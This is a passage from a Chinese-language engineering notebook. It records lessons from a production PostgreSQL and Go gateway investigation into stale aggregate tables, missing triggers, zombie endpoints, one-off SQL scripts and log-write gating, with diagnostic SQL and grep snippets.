⇒ ⇒ ★★ 通用式：⭐⭐⭐ **查「A 依赖谁」时，先把依赖提取成一张表**，
再按「哪些依赖会一起失效」分组 —— 比逐个读定义快一个量级，
且分组本身就是结论的骨架。
⚠ 提醒：`regexp_matches` 是集合返回函数，与 `JOIN` 混用时 `JOIN` 必须在 `LATERAL` **之前**
（写在后面会报 `invalid reference to FROM-clause entry`）。

## 2026-10-19 §124 轮：**一串现象共享一个强解释时，必须对每个现象单独取时间戳**（叙事引力）

### ⭐⭐⭐⭐⭐ 症状相同 ≠ 成因相同；用现成的强解释覆盖后续现象，会漏掉独立的缺陷

§122/§123 已建立解释链「门控停写 ⇒ 一串读端失效」。
面对「`model_cost_per_task_view` 也是 0 行」，最省事是**并入同一叙事**。

实际查主表：
```
api_key_model_cost: 352 行, min(bucket)=2026-06-14, max(bucket)=2026-06-19,
                    staleness = 122 天
门控停写 = 2026-10-13（6 天）
```
⇒ **122 天 vs 6 天，量级差 20 倍** —— 与门控**毫无关系**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **判别动作：一串现象共享一个强解释时，
必须对每个现象单独取时间戳**（或机制位置）。量级差是最快的暴露方式。
⇒ ⇒ ★★★ **`count=0` / `status=suspect` / 「文件里出现过某名字」是症状，不是指纹。**
**指纹必须是时间量级或机制位置。**
⇒ ⇒ ★★ 若照叙事写下，会同时犯三个错：① 漏掉一条 **122 天**的用户可见缺陷；
② 把修复挂到「门控要不要重开」这个错误决策上；
③ 真修法（重建触发器）与门控毫无关系。
★ 同族：[[整齐归零是断链的指纹]]（那是「怎么定指纹」），本条是「**别用一个解释覆盖所有现象**」。

### ⭐⭐⭐⭐⭐ 表退役会**连带带走它的触发器**，而函数还在 —— 「函数存在」不代表「链路活着」

迁移 `2026-06-15-auto-route-mode-cost-table.sql` 在 **老表 `request_logs`** 上建
`trg_update_api_key_model_cost`。后来 `request_logs` 老表不存在了，
而 `_request_logs`（新分区父表）的 **`n_triggers = 0`** ⇒ 触发器从未重建。

⇒ ⇒ ★★★ 于是聚合表 `api_key_model_cost` **静默停更 122 天**，
而消费它的 admin 面板注释仍写着「last 7 days」—— **已空白 4 个月，无任何告警**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **退役一张表时，必须同时检查它承载的触发器、序列、物化视图，
并决定是否在新表上重建** —— 这些附属对象不会随 rename 迁移，也不会自己报警。
⇒ ⇒ ★★ 判别动作：查链路是否活着，看**「谁在写它」**，而不是「它有没有对应的函数」。
函数在、触发器不在 = 链路已死，且死得毫无痕迹。
★ 同族：[[发现缺陷时先列全同族分支]] —— 「退役面」是同族的一个常被漏掉的分支。

### ⭐⭐⭐⭐ 「文件里出现过这个名字」≠「它驱动着生产动作」（第二次付学费）

`grep` 命中 203 个文件。逐个分拣后：
- `v_timeout_effectiveness` / `v_node_switch_analysis` / `v_continuation_effectiveness`：
  **Go 代码零引用** ⇒ **孤儿视图**，上一轮担心的「归零被读成指标良好」在它们身上**不会发生**
- `bg/routing_health_checks.go` 出现在 sqlreadguard 白名单里 ——
  **但白名单的键是文件，它引用的全是别的视图**，差点被当成那三个的消费方
- 真正的消费方是 `admin/auto_route.go`、`admin/probe_dashboard.go`

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **白名单/清单里的「键」与「值」不是一回事** ——
白名单说的是「这个文件被豁免」，不是「这个文件消费了这个视图」。
★ 同族：[[grep 命中字段名后必须确认它属于哪个 struct 和哪张表]]。

### ⭐⭐⭐ 「视图有 0 行」与「视图有 3 万行」同样要定性，别只看行数

`request_logs_bodies_with_current_month` 返回 330,463 行，看起来很健康；
但它的名字是 "with_current_month"，实际只到**当月第 13 天**（门控停写日）。

⇒ ⇒ ★★★ **数据量正常不等于数据新鲜** —— 判据必须包含**时间上界**，
而不是行数或总量。
★ 同族：[[静默失效四形态]] 的形态 ③（假新鲜）。

### ⭐⭐ 调用 `RETURNS trigger` 的函数前先想清楚：**它写不写**

本轮的 `update_api_key_model_cost()` 是 `VOLATILE` 的 **AFTER INSERT 触发器函数**，
调用它没有任何意义（无参 trigger 函数只能被触发器调用），
而误调 `cleanup_stale_in_progress_requests` 这类函数的代价是**生产上执行一次不可逆动作**。

⇒ ⇒ ★★★ **成本不对称的筛选器要往保守侧偏**：
读定义 → 按 `STABLE/VOLATILE` + 是否纯 SELECT 分类 → 只碰「STABLE 且纯读」。
★ 同族：[[宁可错杀不可错调]]。

## 2026-10-19 §125 轮：**用「代码路由 − 运行日志」找僵尸端点，要先测方法的假阳性率**

### ⭐⭐⭐⭐⭐ 端点「零调用」的判定**必须覆盖全部实例**，因为流量在多实例间分散

方法：`grep` 非测试 Go 里的 `/api/admin*` 字面量（归一化 ID 段）
− `journal` 的 `http_request` 日志里的实际 path（归一化）⇒ 候选 294 条。

★ 抽查 6 条候选，去**另一台**核对：

| 候选 | 154（canary@8781） | 245（llmgo-245-canary@8782） |
|---|---|---|
| `/api/admin/probe/dashboard` | 0 | 0 |
| `/api/admin/probe/queue-snapshot` | 0 | 0 |
| `/api/admin/dashboard/errors` | 0 | 0 |
| `/api/admin/dashboard/performance` | 0 | 0 |
| `/api/admin/auto-route/cost/model` | 0 | 0 |
| **`/api/admin/provider-cost-reconciliation`** | 0 | **1** ← 假候选 |

而两台活跃集大小本身就不同：154 = **54**、245 = **43**（归一化后）。

⇒ ⇒ ★★★ ⇒ **「294 个零调用端点」不是结论，是候选清单。**
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **「某物从未出现」这类否定结论，
必须先问「有几个独立的观察点，各自能看到多少」** ——
单点阴性只是「这个点看不到」，不是「它不存在」。
⇒ ⇒ ★★ 推论：**多副本部署下，任何基于日志/指标/采样得出的「不存在」结论，
其可信度上限 = 观察点数量。** 要么加观察点，要么把结论降级为「本点未见」。
★ 同族：[[阴性结论要当缺陷一样复核]] —— 本条给出「阴性」的可证伪步骤：
**换一个观察点再看一次**。而 §121 的「252 上没有网关服务」是同一族另一形态：
那次是**观察点选错了**，这次是**观察点不够**。

### ⭐⭐⭐⭐ **候选清单 ≠ 结论；写下来时要自带折扣说明**

本节那个方法的误差来源逐条列出后才看清：

| 折扣 | 说明 |
|---|---|
| 代码侧是**字面量**不是**注册路由** | 含注释、废弃路由、拼接片段、客户端示例 |
| 运行侧是**单实例** | 实测假阳性 ≥ 1/6 |
| 日志只覆盖 **8 天** | 覆盖不到那条 **122 天**的历史 |

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **凡「A − B = N 条」这类差集结论，
必须把两侧各自的误差来源列全**，否则 N 会被人当成精确值引用。
⇒ ⇒ ★★ 我在本节差点就写成「294 个僵尸端点」—— 那会让下一个人
拿一张**至少 1/6 污染**的名单去做下线决策。

### ⭐⭐⭐⭐ 「零调用 + 数据源停更」同时成立，才是**可处置**的僵尸端点

本节唯一进 P0 的两条是 `/api/admin/auto-route/cost/{model,customer}`：
**两台独立坐实零调用**，且其数据源已停更 122 天（§124）。

⇒ ⇒ ★★★ **僵尸端点的判定是两个条件的合取**：
`零调用` **且** `数据源已停更`。缺任一条都只是候选
（零调用可能只是暂时没人用；数据源停更可能还有别的消费者）。
★ 同族：[[阴性结论要当缺陷一样复核]]。

### ⭐⭐⭐ **零调用本身会降低处置的紧急度**——而这正是它长期不被发现的原因

这两条端点**零调用**，所以处置它们**不影响任何现有用户**。
⇒ ⇒ ★★ 正因如此，它们既不会被用户投诉，也就不会有人报修，
**可以安静地烂 122 天**。
⇒ ⇒ ★★★ 通用式：⭐⭐⭐ **「无人使用」是缺陷能长期存活的最佳掩护** ——
它同时消除了用户侧信号和运营侧动机。
⇒ ⇒ ★★ ⇒ 这类问题只能靠**主动普查**发现，而普查的产物（候选清单）
又天然带误差 ⇒ **最该做的是把它变成自动巡检项**，
而不是每次靠人手工比对一次。

## 2026-10-19 §126 轮：**「一次性脚本域」是结构性盲区**；修法巧合相同 ≠ 依据相同

### ⭐⭐⭐⭐⭐ **凡在生产手工执行过的 DDL，必须补一个 startup 迁移 —— 否则它既查不到、也重建不回**

一条 DB 链路（`api_key_model_cost` ← `trg_update_api_key_model_cost`）停更 122 天。
追查触发器的来源，三处交叉验证**全部为空**：

```sql
grep 'trg_update_api_key_model_cost' sql/schema/01-schema.sql    → 0 行   -- 基线
grep -r 'trg_update_api_key_model_cost' sql/migrations/startup/  → 0 行   -- 561 个迁移
grep -r 'update_api_key_model_cost' db/ admin/ bg/ internal/     → 0 行   -- 应用代码
```

建它的 SQL 只存在于两个「归档/打包」路径。真相链条：

```
2026-06-14 ~ 07-25   仓库根 docs/ 的一次性 SQL 窗口（11 个文件）
   ↓ 有人在生产手工执行 ⇒ 触发器建立在当时的 request_logs 上
后来  文件被移出 docs/，归档进 docs/archive/process/schema-history/
现在  docs/ 根目录 0 个 .sql ⇒ 连「这个窗口存在过」的清单都没有了
```

⇒ ⇒ ★★★ 三个后果缺一不可：
① **审计查不到**（不在迁移历史里）
② **重建回不来**（不在基线里）⇒ CI 测试库 / 新环境 / 灾备**从一开始就没有它**
③ **窗口已消失**（`docs/` 空）⇒ 无法回答「还建过哪些对象」

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **「一次性脚本域」生产过生产对象，却从未进入任何可审计、
可重建的体系。** 它是所有「某个环境有、另一个环境没有」的经典来源。
⇒ ⇒ ★★ 判别动作：**对象来源三问** ——
它在 startup 迁移里吗？它在基线 schema 里吗？应用代码会建它吗？
**三个都否 ⇒ 它是手工产物，新环境必然缺失。**
★ 同族：[[退役时连带丢失的触发器]] —— 那条讲「改名/退役时的附带损失」，
本条讲更根本的「**它压根不在体系里**」。

### ⭐⭐⭐⭐⭐ **「打包副本」不是「执行渠道」—— 看目录名字会猜错来源**

`deploy/sql/docs/features/2026-06-15-…sql` 看起来像正式迁移目录。
但 `deploy/sql/migrate-sql-files.sh:52-54` 揭示它是**复制产物**：

```bash
# 迁移 docs/*.sql 到 docs/features/
find "$PROJECT_ROOT/docs" -maxdepth 1 -name "*.sql" -exec cp -v {} "$DEPLOY_SQL_DIR/docs/features/" \;
```

⇒ 真实来源是**仓库根 `docs/`**（一次性手工执行域），
`verify-migration.sh:102` 对该目录的检查也只查「≥10 个文件」的**数量**。
⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **看到一份 SQL 文件时，要先确认「谁会执行它」，
而不是「它放在哪个目录」。** 归档路径、打包路径、文档路径里的 SQL **可能从未自动运行过**。
⇒ ⇒ ★★ 判别动作：**grep 加载方**（脚本/启动代码里有没有读这个目录），
而不是看目录名像不像迁移目录。

### ⭐⭐⭐⭐⭐ **时间对不上，就是「机制描述错了」的最强信号**

§124 我写「触发器随老表退役消失」。核对两组时间：

| 事件 | 时间 |
|---|---|
| `api_key_model_cost` 停更 | 2026-06-19 |
| 迁移 860 执行改名 | 2026-10-14 |

⇒ 860 **晚 4 个月** ⇒ 机制不可能是它。
⚠ 且 860 全文**没有任何 `DROP TRIGGER`**，而 `ALTER TABLE … RENAME TO` **保留触发器**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **写因果链时，两个时间戳必须先对一遍** ——
时间不相容时不是「细节待补」，而是**整条因果链要重写**。
⇒ ⇒ ★★★⭐ **更狠的一层**：本例的**修法巧合地相同**（都指向「在 `_request_logs` 上重建」），
**但依据完全不同**。
⚠ 若只记结论不订正依据，下一个人会误以为「改名会丢触发器」，
从而给**所有改名操作**加上不必要的警告，或在 860 上白花时间。
⇒ ⇒ ★★ ⇒ **结论相同不构成「不用订正」的理由**；错误依据会导向错误的泛化。
★ 同族：[[订正要写清哪部分对哪部分错]] · [[时间戳对不上就是因果链要重写]]。

### ⭐⭐⭐ 阴性结论要覆盖**三个来源**，缺一不可

「这个对象不在体系里」需要三处同时为空才算立得住：
**startup 迁移 / 基线 schema / 应用代码**。
只查其中一处就下结论，会在「有迁移但没进基线」或「有代码但只在某环境启用」的情形上出错。

⇒ ⇒ ★★★ 而本例三处**确实同时为空** ⇒ 这才叫「不在体系里」，
而不是「我没找到」。★ 与「0 命中的第一嫌疑是量具坏」互为镜像：
**三处都空**是本例能给出强结论的原因。

### 2026-10-19 §127 一次性 SQL 域盘点：盲区实际只有 3 个对象，而「重建触发器」这个修复动作会打断生产写入

§126 立了待办「盘点 `docs/archive/process/schema-history/` 下的 `.sql`」。

**1. 盘点口径决定结论量级 —— 必须逐对象对账，不能按文件域一刀切。**
实测 10 个 `.sql`（6-14~6-22，约一周半，比 §126 估的 6 周小）、17 个 DB 对象，
对基线 / startup 迁移 / Go 代码三处后：**只有 3 个对象不在体系内**
（`trg_update_api_key_model_cost` + 2 个索引），其余 14 个都在，
且 `notify_auto_route_refresh` 一族**被 5 个 startup 迁移反复修订**。
⇒ ⇒ ★★★ **「某文件在一次性域里」推不出「它建的对象都不在体系内」。**
同族机制也会把同一功能域里的大多数对象收编进迁移体系 ⇒ **按域估算会高估一个数量级**。
⇒ ★ 判别动作：**逐对象三处对账**（基线 / 迁移 / 代码），别按文件或功能域打包下结论。

**2. 「不在体系里」≠「没生效过」—— 这两句话要分别取证，否则会漏掉定位时刻的唯一凭据。**
§126 只证了前者（生产上函数在、触发器零）。本轮实测：**表里有 352 行真实数据**，
`min_bucket = 2026-06-14 23:40:00+08`，而改这个函数的 commit `3cf9e6bbe` 提交于
**2026-06-14 23:41:25 +0800** —— **同一分钟**。
⇒ ⇒ ★★★ **触发器确实建过、确实按预期写了 5 天。**
⇒ ★★★ 通用式：**凡审计「某对象是否生效过」，`min(时间戳)` 往往比「有没有它」更有信息量。**
★ 同族：[[长期指标先按时间分段找断点]] —— 同一个动作的「存在」与「活过多久」是两个量。

**3. ★★★★★ 修复动作的顺序本身就是交付物 —— 顺序错会从「修 bug」变成「造事故」。**
表无 PK ⇒ 函数里的 `ON CONFLICT (bucket, api_key_id, raw_model)` 必然报 **SQLSTATE 42P10**。
本地沙箱按生产形态复现 + 变异验证：`AFTER INSERT FOR EACH ROW` 触发器抛错
⇒ **外层 `request_logs` 的 INSERT 被连带回滚**（实测请求日志计数 = 0）；
补唯一索引后同一插入立刻成功、同 bucket 第二次走 `DO UPDATE` 累加。
⇒ ⇒ ★★★ **「重建触发器」这一个动作，拆开是「补索引 → 重建触发器」两步且不可换序。**
⇒ ⇒ 🚨 而更狠的是**补索引这步本身也会失败**：实测 **352 行全部落在重复组里**
（88 组 × 4 行，去重后 88 行，`updated_at` 到微秒相同 ⇒ 一次批量重放 4 次），
`CREATE UNIQUE INDEX` 会直接冲突 ⇒ **正确顺序是三步：聚合去重 → 补唯一索引 → 重建触发器。**
⇒ ★★★ 通用式：**验一个修复动作是否安全，要问「它在当前 DB 状态下执行会怎样」，
而不是「它的语义对不对」。** 语义对的修复在错误的状态下执行可以是破坏性的。
★ ★ 同族：[[顺序是硬约束：先清零再改阻断]] —— 那里是门禁，这里是数据修复，形态相同。
★ ★ 关键点：**§124/§126 建议的「重建触发器」单独执行会打断生产日志写入**，
而 §125 实测这两个端点零调用 ⇒ **零流量把这个会打断写入的缺陷掩盖了 122 天**。
（[[无人使用是缺陷长期存活的最佳掩护]] 第三例。）

**4. `xid` 没有默认排序算子。**
`ORDER BY pg_class.xmin` 直接报 `could not identify an ordering operator for type xid`
⇒ 必须 `age(xmin)::bigint` 后再排。
⇒ ★ `age()` 是 PG 里唯一的「对象年龄」量具；问「谁先建谁后建」用它，别靠 commit 日期猜
（本例 commit 日期给出天级答案，`age()` 给出事务级顺序：表/两视图/`_stmt` 同批，
行级函数年轻一代 ≈ 1/29 ⇒ 它被 `CREATE OR REPLACE` 重写过）。
★ 附带：plpgsql 的 dollar-quote 是 `$$`，写成 `$` 必然语法失败
⇒ **从 git 里捞脚本重建前，先看它当年是否原样可执行**（本例那版脚本原样执行必失败，
生产上生效的是修正版 ⇒ 照抄 git 会踩坑）。

### 2026-10-19 §128 「不可重建」≠「不可审计」；「对象缺失」≠「要补」

**1. 重命名提交会被 `--diff-filter=D` 误报成删除。**
判「某个文件是否还在」不能只看 `git log --diff-filter=D`：
本节那批一次性 `.sql` 全被报成「删除」，但 `git show --stat -M` 显示它们**全是 rename、相似度 100%、内容零变化**，
`git ls-tree <rev>^ docs/` 还能逐一确认改名前在哪个目录。
⇒ ⇒ ★★★ **盲区是「不可重建/不可自动执行」，不是「不可知/信息已丢失」。**
⇒ ★★★ 把「根 docs/ 下 0 个 .sql」读成「脚本域已消失、无法回答历史」，
会**直接导向放弃盘点**——而盘点恰恰给出了可执行的补迁移清单。
⇒ ★ 通用式：**判「文件是否还在」要配 `-M`（rename 检测）+ `ls-tree <rev>^`（改名前路径），不能只看 filter。**
（对应「不可重建」与「不可审计」是两个维度，混淆会让人放弃本可完成的工作。）

**2. 「对象缺失」不等于「要补」——补之前先问「它服务的东西是否已有人服务」。**
实测两个孤儿索引在生产确实不存在（阴性结论成立），
但 `client_model` 这个查询面已被 5+ 个等价索引（含 hash/lower/text_pattern_ops 三个变体）覆盖
⇒ 补它们**零性能收益**，只有 schema 完整性收益 ⇒ 从「待清理的孤儿」降级为「不必做」。
⇒ ★★★ 通用式：**为了「体系完整」而补的对象，要单独记一笔它的收益是什么**，
否则待办清单会攒下一堆「补了也没用」的项。
★ 配套：判定依据是「查询面是否已被覆盖」，不是「索引名是否存在」。

**3. 宽视图的 `count(*)` 超时与 `LIMIT 1` 秒回并存 = 全量展开失控，且根因不是缺索引。**
`request_logs_with_current_month`：`LIMIT 1` 秒回，`count(*)` **180s 超时跑不完**。
先按最容易被猜的成因（缺索引）去否证——`session_turns` 族的 `request_id` 索引**齐全**；
真正的成本在骨架里的 `LEFT JOIN LATERAL`（对 338,976 行逐行查父表）× 60+ 个输出列（含大文本列），
且 `UNION ALL` 的第一个分支读的是**0 行**的 `_request_logs_hot`，恒空纯浪费。
⇒ ⇒ ★★★ 通用式：**「秒回 vs 跑不完」这个组合本身就是形态判据**——
它指向「全量展开成本」，而不是「表坏/锁死/缺索引」，且能一眼排除掉一大类成因。
⇒ ★★ **诚实边界**：上面是**从视图定义 + 上游行数推断**的根因，**没有跑 `EXPLAIN ANALYZE`**——
因为在无授权的生产上跑它等于**真的执行一遍**那个 180s 重查询。
⇒ ★★★ **实测的成本数字**（180s 超时）与**推断的根因**必须分开记，
「要坐实」得单列一条授权项（先做只读副本）。
★ ★ 同族：[[阴性结论要当缺陷一样复核]] —— 先否证最容易被猜的成因，再定位；
[[先读量具再读产物]]。

**4. PGRE 第二个陷阱：`regexp_matches` 是集合返回函数。**
`regexp_replace(m.raw, ...)` 直接报 `function regexp_replace(text[], unknown, unknown) does not exist`
⇒ 必须 `(regexp_matches(...))[2]` 取第 N 个捕获组。
⇒ ★ 「长定义刷屏」的正解是**先提取成一张小表再打印**（本节先被刷屏两次才改对），
不是把全文 `SELECT` 出来。
★ ⚠ 同类的老坑仍在：`\b` 在 PGRE 里是退格符不是词边界（用 `\y`）。

### 2026-10-19 §129 「索引占着大空间」≠「REINDEX 能回收」；给性能缺陷定级要用分布而不是极值

**1. ★★★★★ 「索引占着大空间」不等于「REINDEX 能回收」—— 必须先看底表有没有被 TRUNCATE。**
`_request_logs_bodies_hot` 的 `relpages=0`（TRUNCATE 痕迹）+ `relfilenode=81522141`
⇒ §114 立项的 `pg_toast_81522141_index`（229 MB）**早已随 TRUNCATE 清空**，
REINDEX 对它是**纯 CPU 浪费** ⇒ 该待授权项撤销。
⇒ ⇒ ★★★ 形态指纹：**`relpages=0` 但 `pg_total_relation_size` 很大
⇒ 空间全在索引/TOAST 上，且索引大概率已是空的。**
⇒ ★ **判别动作**：查任何「索引膨胀/REINDEX」待办前，先查底表的 `relpages`——
`pg_toast_<oid>` 里的 oid 就是该表的 `relfilenode`，这是把「文档里的对象名」
与「生产上那张真实表」对上的唯一可靠钥匙。
★ ★ 同族：[[对象缺失不等于要补]] —— 那里问「该不该补」，这里问「补了有没有收益」。

**2. ★★★★ 给性能缺陷定级时，要用真实调用形态重测，而不是用最悲观的查询形态。**
同一张慢视图：`count(*)` 无过滤 **>180s 超时**，但点查 **137ms**、100 行 **116ms**、1 天窗口 **4.08s**。
⇒ ⇒ ★★★ 上一轮据「无过滤 count 超时」判成 P0，本轮按真实消费者形态重测后**下调为 P2**
——收益主要落在巡检/统计路径，不在接口路径。
⇒ ⇒ 🚨 **若不重测，就会把一条 P2 报成 P0，并浪费一次宝贵的生产变更窗口。**
⇒ ★★ 通用式：**定级用的输入必须是分布，不是极值。**
★ ★ 这与 [[校准要报差多少倍且要看分布宽不宽]] 同源：
合成夹具/极端样本定出来的 operating point，要用真实采集的输入复核一遍。

**3. ★★★ 「同族里哪些成员还在动」是最快的一致性判据。**
看到 `_request_logs_hot` 为 0 行，一次 `pg_stat_user_tables` 就判掉了「异常还是正常」：
同族 4 张 hot 表里 session 侧 2 张**今天**还在 autovacuum，请求日志侧 2 张停在 10-14 04:33
⇒ 差异本身指向 10-13 20:18 的门控停写 ⇒ **0 行是正常后果，不是缺陷**。
⇒ ★ 通用式：**判某张表异常，先同族横向对比活动时间戳，别单表深挖。**
★ ★ 同族：[[阴性结论要当缺陷一样复核]] —— 横向对比是最便宜的否证动作。
★ ⚠ 而 `count(*)=0` 本身是 [[假零]] / 静默失效形态③④：空结果长得像「很干净」，
真相是「已经瞎了 6 天」⇒ **给「不知道」设计一个和「值为零」长得不一样的表示**。

### 2026-10-19 §130 「有张力」要先验证张力是否真实；两个不一致不许合并成一个故事

**1. ★★★ 两个「不一致」可能有完全独立的成因 —— 别把它们合并成一个故事。**
§123 留下「`_request_logs` 338,976 vs bodies 330,463，差 8,513，与 §116『孤儿行 0』有张力」。
本节实测差集只有一个方向（logs 多 8,513、反向 **0**）⇒ **张力根本不存在**，
是自己把「两侧计数不等」误当成矛盾。
⇒ ⇒ 🚨 最容易犯的错：缺口 8,513 和「`_request_logs_hot` = 0 行」都摆在面前，
就顺手把后者说成前者的成因。**逐列验证后两者无关** ——
缺口那 8,513 行的 `outbound_body` / `request_preview` / `response_preview` **全部为空**
（且全部 `success=true`）⇒ 它们**本来就没有正文可存**，不是「本该有的行丢了」。
⇒ ⇒ ★★★ 通用式：**给每个「不一致」单独找它的独立证据，不许复用另一个的解释。**

**2. ★★★ 差集若成簇 ⇒ 是批量操作/部署窗口的产物，不是随机写失败。**
8,513 行落在 **5 个离散日期**上，其中 09-30（4,307）与 10-12（3,265）占 **89%**
⇒ 一句话排除「随机丢行」这一整族成因。
⇒ ★ 同族：[[长期指标先按时间分段找断点]] 的小型版 —— **分布比总量有信息量**。

**3. ★★★★ 顺手挖到一个真缺陷，但它与主线无关（这正是要点 1 的价值）。**
`upsertRequestLogBodies` 是 `INSERT ... SELECT ... FROM _request_logs_hot`，
而 §129 实测该源表 **0 行** ⇒ `SELECT` 无行 ⇒ **一条正文也写不进去**。
⇒ ★ 这是真缺陷，但**不能**拿它解释 8,513 缺口。
⇒ ⇒ ★★★ 通用式：**同一轮里挖到 A 缺陷时，别因为它「看起来正好能解释」B 现象就扣上去。**
两个现象各有各的证据链，混用会让其中一个的结论失去支撑。

**4. ★★★ 列名不要猜。**
`information_schema.columns` 不带 `table_name` 会把三张表的同名列混在一张结果里
（本节 `_request_logs` / `_request_logs_bodies` / `request_logs_2026_10`
都出现 `outbound_body`，差点得出「主表有三件套」的错结论）。
⇒ ★ 正确做法：**按 `table_name` 分组看**，别用一列裸 `column_name` 就下判断。
★ ⚠ 同一次查询里 `l.request_body` 报 `column does not exist` 也提示
`_request_logs` 主表上**根本没有 `request_body` 列**（只有 `outbound_body`），
而 bodies 表有三列 ⇒ **正文已从主表拆走**（这本身是一条结构证据）。

### 2026-10-19 §131 给属主报「某事已发生 X 天」时，必须同时报「它还能不能撤销、几步」；门控决策先查循环依赖

**1. ★★★★ 「不可逆的既成事实」与「随时可撤销的开关」在文档里长得一模一样 —— 要查可逆性。**
报「v1 请求日志已停写 6 天」听起来像既成事实。实测发现重新开门控所需的**全部** DB 对象
（热表 `PRIMARY KEY(request_id)` + 11 个 promote/archive 函数 + 三张相关表）**一个不缺**
⇒ 它只是一个 `settings_kv` 单点值 + HotReload，**可回滚**。
⇒ ⇒ ★★★ 通用式：**给属主报「某事已发生 X 天」时，同时报「它还能不能撤销、需要几步」**，
否则属主会在不知情下把一个开关当成既成事实。

**2. ★★★★ 门控类决策：先查「决策自己是否依赖它要控制的状态」。**
`cmd/gateway/dual_read_gate.go:192-204` 的规则 1 明确要求「v1 写入必须还开着」才有资格判断
⇒ **v1 一旦停写，这个 pre-gate 就永远无法自己打开**（返回 `Void` / `s4GateReasonV1WritesDisabled`），
文件头 `:9-27` 早就把这个失效形态写成注释（「S4 会关掉它自己的观测手段」）。
⇒ ⇒ ★★★ **「用 X 决定是否开 X」在 X 关闭后是循环依赖** ——
要恢复一个被自己关掉的东西，必须设计**能制造观测窗口的临时步骤**，不能直接拨回开关。
★ 本例结论：「恢复 v1 写入」**不是单点动作，而是一次有窗口要求的实验**。

**3. ★★★★ 两个看似矛盾的结论：先怀疑自己其中一个的量具。**
§120 记「final-success 自 10-14 归零」，我 `count(*)` 得 19,702 非零 ⇒ 看着矛盾。
复核发现：19,702 是**全月累计**，§120 说的是**按天归零** ⇒ 两者都对。
⇒ ⇒ ★★★ 通用式：**「合计」与「分段」不是同一个量**；报归零类结论时**必须带时间维度**。
★ 判别动作：分区表实测为 `RANGE (partition_date)` 分区 ⇒ **两种口径都要跑一遍**，本例两者一致才算坐实。
（同族：统计表里的「合计」必须由明细算出。）

**4. ★★★ 两条「独立现象」很可能是同一条因果链的两面。**
§120 一度把 v1 停写与 final-success 归零当两条独立线。实测两者在**同一天同一小时**断崖
（10-13 当天 792 / 511 正是停写前的部分，`settings_kv.updated_at=20:18:27` vs `_request_logs` 末笔 `20:18:11` 相差 16 秒），
且代码里 `if logsWrite && shouldClaimFinalSuccess(...)` 本就在同一道门内（`client.go:1954` / `:2668`）
⇒ **它们是同一条线的两面**。
★ ⇒ **「v1 停写」与「final-success 归零」不是两个缺陷，是一道门控的两处后果** ——
这直接把 §120 的两选项（开门控 / 给 session 侧开独立 claim 路径）收敛成一个真选择题。
★ 同族：[[阴性结论要当缺陷一样复核]] —— 也要复核「阳性结论之间是否其实同源」。

### 2026-10-19 §132 补完 §131 尾巴：分区父表 size 恒为 0；「A 是 B 的超集」这个假设常常是错的

**1. ★★★★ 分区父表的存储函数返回 0 —— 「免费」是量具故障，不是事实。**
`pg_total_relation_size('分区父表')` 恒为 0（父表本身不存数据）：
实测 `_request_logs` 父表 = 0 bytes，而叶子 `request_logs_2026_10` = **1015 MB**；
`session_turns` 父表 = 0 bytes，叶子 = **1194 MB**。§131 的 D5 正是因此量纲写错。
⇒ ⇒ ★★★★ 判别动作：**分区表测存储一律遍历 `pg_inherits` 的叶子分区求和，或直接量分区名。**
★ 同源坑：分区父表上 `min(ts)` 报 `column "ts" does not exist`，而读字典确认 **`ts` 列存在**
⇒ ★★ **报错要区分「列不存在」与「父表无数据」**，别把量具故障当成结构结论。

**2. ★★★★ 两个方向相反的实测事实必须一起说，否则会被引用成片面结论。**
同一 14 天窗口：v1 每行 **4,989 B** vs v2 每行 **5,933 B**（v1 省 **16%**），
但 v1 日行数 **37,586** vs v2 **13,857**（v1 多 **2.7 倍**）⇒ **净效果是多写 2.4 倍的行 ≈ +180 MB/天**。
⇒ ⇒ ★★★ **⇒ 停写省的不是「每行更小」，而是「少记 62% 的行」。**
只报前者会让人以为恢复双写更省，只报后者会以为 v1 更贵。

**3. ★★★★★ 「A 是 B 的超集」这个假设必须实测，因为它常常是错的。**
实测 `session_turns` **不含 134,266 条失败请求**：
`v1_only=203,430` vs `in_both=135,546` ⇒ **37.5% 的 v1 行在 v2 里根本不存在**
（其中 `success=f` 的 134,266 行、`success=t` 的 69,164 行）。
⇒ ⇒ 🚨 **停写 6 天 = 失败事件永久缺失**，而**不只是「指标失真」** —— 这把决策选项 A 的代价低估了一个量级。
⇒ ⇒ ★★ 同时纠正 §122 的方案：`system_health_status` 加 `session_turns_hot` 兜底
**只能恢复成功率读数，恢复不了失败事件**（数据侧就不在）。
⇒ ★★★★★ 判别动作：**做替换/下线决策前，先跑 `v1_only` 的特征画像**
（按 `success` / `request_type` 分组）—— 差额往哪走一目了然。
★ 这个画像还能**反过来纠正决策权重**：它把「停写的代价」从「指标失真」升级为「数据丢失」。
★ ★ 同族：[[两个独立现象很可能是同一条因果链的两面]] —— 这里的因果链是
「v1 记的更全 ⇒ 停写 v1 ⇒ 丢的那类数据无人补」。

### 2026-10-19 §133 差集定性前必须再按业务维度切一层；函数名说的是意图，参数说的是事实

**1. ★★★★★ 拿到「A 比 B 多出的行」之后，必须再按维度切一层才能定性。**
§132 拿到 `v1_only=203,430` 就直接命名为「缺失的失败请求」，
**没先按 `origin_actor` 切** ⇒ 结果把 97% 的**探针流量**当成了**用户请求**，
并据此把一个决策选项的代价夸大了 **72 倍**（134,266 → 实际 1,871）。
⇒ ⇒ ★★★ **⇒ 「为什么这行不在 B」与「这行是什么」是两个独立问题**，
回答第一个之后必须回答第二个，缺一个就会定性错误。
⇒ ★ 判别动作：任何 `EXCEPT` / 反连接出来的差集，
**先按业务维度 `GROUP BY` 一遍再命名**（`origin_actor` / `request_type` / `task_type` / `success`）。
★ ★ 这是本条纪律的镜像形态：§132 的原教训（「A 是 B 的超集假设必须实测」）**本身是对的**，
错在**实测之后没有继续分组** ⇒ 实测到差集只是中间站，不是结论站。

**2. ★★★★ 读函数要读到参数表，别从函数名推断行为。**
`internal/sessionv2mirror/hook.go:113` 的 `IsInternalAutoEntry(entry)`
名字与调用点都让人以为它在判「失败请求」，
但真正决定语义的是 `internaltraffic.IsInternalLoopback(isAuto, requestType, originActor, taskType)`
